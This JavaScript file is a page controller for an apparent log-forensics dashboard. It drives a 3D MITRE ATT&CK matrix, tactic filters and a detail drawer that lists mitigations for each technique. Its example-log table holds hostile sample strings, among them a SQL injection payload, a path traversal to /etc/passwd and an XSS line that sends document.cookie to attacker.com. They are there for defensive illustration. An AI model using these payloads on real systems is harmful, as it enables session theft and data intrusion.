/**
 * INTELLIGENT LOG FORENSIC - MITRE ATT&CK PAGE CONTROLLER
 * 3D Tactical Matrix interaction, category filters, and slide-in forensics drawer
 */

document.addEventListener('DOMContentLoaded', () => {
  const drawer = document.getElementById('mitre-drawer');
  const closeDrawerBtn = document.getElementById('close-drawer-btn');

  // 1. Initialize 3D MITRE Matrix
  const mitreMatrix = new MitreMatrix3D('mitre-matrix-canvas', {
    isMiniTeaser: false,
    onSelectTechnique: (tech) => showTechniqueDetail(tech)
  });

  // 2. Tactic Filter Chips
  document.querySelectorAll('.tactic-chip').forEach(chip => {
    chip.addEventListener('click', () => {
      document.querySelectorAll('.tactic-chip').forEach(c => c.classList.remove('active'));
      chip.classList.add('active');
      const tactic = chip.getAttribute('data-tactic');
      if (mitreMatrix) {
        mitreMatrix.filterByTactic(tactic);
      }
    });
  });

  // 3. Technique Detail Drawer Handler
  function showTechniqueDetail(tech) {
    if (!drawer) return;

    document.getElementById('drawer-tech-id').textContent = tech.id;
    document.getElementById('drawer-tech-name').textContent = tech.name;
    document.getElementById('drawer-tech-tactic').textContent = tech.tactic;
    document.getElementById('drawer-tech-detected-count').textContent = `${tech.detected} events detected`;

    // Severity badge
    const badge = document.getElementById('drawer-tech-sev');
    if (badge) {
      badge.textContent = (tech.sev || 'medium').toUpperCase();
      badge.className = `badge ${tech.sev === 'critical' ? 'badge-critical' : 'badge-high'}`;
    }

    // Populate forensic mitigation and log patterns
    document.getElementById('drawer-tech-logs').innerHTML = `
      <div style="background:var(--surface-secondary);padding:10px;border-radius:4px;font-family:var(--font-mono);font-size:0.8rem;border:1px solid var(--panel-border);color:#67E8F9;">
        ${getExampleLog(tech.id)}
      </div>
    `;

    document.getElementById('drawer-tech-mitigations').innerHTML = `
      <ul style="padding-left:18px;font-size:0.85rem;color:var(--text-secondary);line-height:1.6;">
        ${getMitigations(tech.id).map(m => `<li>${m}</li>`).join('')}
      </ul>
    `;

    drawer.classList.add('open');
  }

  function getExampleLog(id) {
    const examples = {
      'T1190': 'POST /api/v1/search HTTP/1.1 - payload: \' UNION SELECT null, username, password FROM users --',
      'T1110': 'AUTH FAIL - user: root - ip: 198.51.100.44 - attempt 52 in 30s',
      'T1083': 'GET /static/../../etc/passwd HTTP/1.1 - status 403 Forbidden',
      'T1059': 'GET /search?q=<script>fetch("http://attacker.com/"+document.cookie)</script>',
      'T1046': 'SCAN - 192.168.1.0/24 - SYN probe on ports 22,80,443,3306,8080',
      'T1068': 'SUDO: guest : COMMAND=/bin/bash (NOPASSWD root execution)',
      'T1041': 'POST /upload - 847MB transferred outbound to external ASN 45.146.164.110',
      'T1071': 'GET /c2/beacon - interval 30s - AES encrypted token stream',
      'T1003': 'ACCESS: /etc/shadow - Process: mimikatz (Memory extraction)',
      'T1021': 'SSH: 10.0.0.12 -> 10.0.0.47:22 - Accepted publickey for admin'
    };
    return examples[id] || 'Anomalous network telemetry payload flagged by detection engine.';
  }

  function getMitigations(id) {
    const mitigations = {
      'T1190': ['Implement parameterized SQL queries / ORM prepared statements', 'Deploy Web Application Firewall (WAF) with OWASP Core Rules', 'Audit endpoint input validation schemas'],
      'T1110': ['Enforce Multi-Factor Authentication (MFA)', 'Configure IP rate limiting and exponential lockout timers', 'Deploy adaptive behavioral CAPTCHA challenge'],
      'T1083': ['Normalize file paths and validate against strict directory whitelists', 'Run web server with minimal chroot jail permissions'],
      'T1059': ['Implement Content Security Policy (CSP) headers', 'Contextually encode all dynamic user output in DOM templates'],
      'T1046': ['Configure ingress firewall to drop unsolicited port scans', 'Deploy internal honeypots to detect lateral network mapping'],
      'T1068': ['Audit sudoers file and eliminate wildcards / NOPASSWD directives', 'Keep kernel and suid binaries strictly patched'],
      'T1041': ['Enforce outbound egress traffic filtering and DLP monitors', 'Alert on high-volume asymmetric egress anomalies'],
      'T1071': ['Implement TLS inspection and C2 domain reputation filtering', 'Detect periodic beaconing jitter via statistical traffic analysis'],
      'T1003': ['Enable LSASS RunAsPPL protection on Windows hosts', 'Restrict /etc/shadow read access to root only with auditd monitoring'],
      'T1021': ['Enforce SSH certificate authority and disable password authentication', 'Segment network VPC subnets with strict microsegmentation']
    };
    return mitigations[id] || ['Apply least privilege access principles', 'Monitor host telemetry with endpoint detection (EDR)'];
  }

  if (closeDrawerBtn && drawer) {
    closeDrawerBtn.addEventListener('click', () => drawer.classList.remove('open'));
  }
});
